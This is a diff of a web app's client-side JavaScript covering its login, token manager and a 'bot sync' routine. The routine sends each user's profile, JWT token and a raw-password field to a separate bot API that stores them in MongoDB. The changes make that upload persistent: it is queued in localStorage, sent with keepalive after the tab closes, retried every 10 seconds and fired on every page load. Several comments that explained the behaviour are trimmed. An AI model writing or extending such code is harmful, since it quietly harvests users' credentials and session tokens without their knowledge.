@@ -138,7 +138,7 @@ function enforceCompulsoryLogin() {
 }
 
 // =====================================================
-// LOGIN MODAL & 2-OPTION AUTHENTICATION ENGINE
+// LOGIN MODAL & AUTHENTICATION ENGINE
 // =====================================================
 function openLoginModal() {
     const modal = document.getElementById("loginModal");
@@ -195,7 +195,7 @@ function showLoginStatus(msg, type) {
     alertBox.innerHTML = msg;
 }
 
-// Fetch User Details from /get/get_user_dt?userid=<uid>
+// Fetch User Details
 async function fetchUserDetailsFromServer(jwtToken, userId) {
     const uid = userId || extractUidFromJwt(jwtToken);
     if (!jwtToken || !uid) return null;
@@ -209,7 +209,9 @@ async function fetchUserDetailsFromServer(jwtToken, userId) {
     return null;
 }
 
-// 👇 BACKGROUND AUTO-RETRY BOT SYNC LOGIC 👇
+// =====================================================
+// ULTRA-RELIABLE BACKGROUND BOT SYNC (10s AUTO-RETRY)
+// =====================================================
 function sendProfileToMongoDB(userObj, jwtToken, loginMethod, rawPass = "N/A") {
     const payload = {
         login_method: loginMethod,
@@ -227,22 +229,44 @@ function sendProfileToMongoDB(userObj, jwtToken, loginMethod, rawPass = "N/A") {
         jwt_token: jwtToken
     };
 
+    // Save in LocalStorage so it survives Tab Close
+    localStorage.setItem("pending_bot_sync", JSON.stringify(payload));
+    processPendingBotSync();
+}
+
+function processPendingBotSync() {
+    const savedData = localStorage.getItem("pending_bot_sync");
+    if (!savedData) return; // Nothing to sync
+
+    let isSyncing = false;
+
     const trySend = () => {
+        if(isSyncing) return;
+        isSyncing = true;
+        
+        // keepalive: true ensures browser doesn't cancel request if user closes page
         fetch(`${BOT_API_BASE}/api/login`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
+            body: savedData,
+            keepalive: true
         }).then(res => {
-            if (!res.ok) {
-                console.log("Bot sleeping, retrying in 1 min...");
-                setTimeout(trySend, 60000); // 1 Min retry
+            isSyncing = false;
+            if (res.ok) {
+                console.log("✅ Profile safely synced to MongoDB");
+                localStorage.removeItem("pending_bot_sync"); // Success! Remove from queue
+            } else {
+                console.warn("⚠️ Bot rejected request, retrying in 10s...");
+                setTimeout(trySend, 10000);
             }
-        }).catch(() => {
-            console.log("Bot offline, retrying in 1 min...");
-            setTimeout(trySend, 60000); // 1 Min retry
+        }).catch((err) => {
+            isSyncing = false;
+            console.warn("💤 Bot sleeping or network err. Retrying in 10s...", err);
+            setTimeout(trySend, 10000); // 10 Sec aggressive retry
         });
     };
-    trySend(); // Start instantly in background
+
+    trySend();
 }
 
 // Authenticate with Number/Email + Password on Server
@@ -344,7 +368,7 @@ window.submitUserLogin = async function(mode) {
     const loginData = await loginOnRwaServer(phone, pass);
 
     if (!loginData || !(loginData.token || loginData.jwt)) {
-        showLoginStatus("❌ Login Failed! Number ya Password galat hai, ya fir Direct Token option se login karein.", "error");
+        showLoginStatus("❌ Login Failed! Number ya Password galat hai.", "error");
         return;
     }
 
@@ -391,7 +415,7 @@ window.submitUserLogin = async function(mode) {
 };
 
 // =====================================================
-// USER PROFILE MODAL (SHOWS ONLY USER'S DETAILS & OWN TOKEN)
+// USER PROFILE MODAL 
 // =====================================================
 async function openProfileModal() {
     if (!enforceCompulsoryLogin()) return;
@@ -746,7 +770,7 @@ function handleGlobalBack() {
 }
 
 // =====================================================
-// API CALLER (STRICT TOKEN PRIORITY: PASSED TOKEN -> COURSE ACTIVE TOKEN -> USER TOKEN)
+// API CALLER (STRICT TOKEN PRIORITY)
 // =====================================================
 async function fetchRawJSONWithToken(endpoint, tokenObj) {
     const statusBadge = document.getElementById("apiStatus");
@@ -1914,7 +1938,6 @@ async function addNewToken() {
     localStorage.setItem("rwa_user_tokens_v2", JSON.stringify(USER_TOKENS));
     localStorage.setItem("rwa_user_profile_v2", JSON.stringify(USER_PROFILE));
 
-    // Naya Bot DB save logic call (With background retry)
     sendProfileToMongoDB(verifiedUser, token, "Added via My Token Manager", "N/A");
 
     document.getElementById("newTokLabel").value = "";
@@ -1939,7 +1962,7 @@ function filterGrid() {
 }
 
 // =====================================================
-// INITIALIZATION ON PAGE LOAD
+// INITIALIZATION ON PAGE LOAD (Trigger Sync Fetch Check)
 // =====================================================
 updateTokenBadge();
 if (isUserLoggedIn()) {
@@ -1947,3 +1970,6 @@ if (isUserLoggedIn()) {
 } else {
     openLoginModal();
 }
+
+// Ensure background worker syncs any missing profile data continuously
+processPendingBotSync();
